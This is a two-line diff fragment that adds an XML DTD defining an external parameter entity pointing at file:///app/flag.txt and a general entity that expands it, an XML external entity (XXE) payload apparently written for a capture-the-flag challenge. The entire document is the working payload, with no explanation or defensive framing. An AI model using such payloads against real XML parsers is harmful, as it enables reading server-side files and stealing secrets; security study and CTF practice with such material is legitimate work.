@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///app/flag.txt">
+<!ENTITY content "%data;">
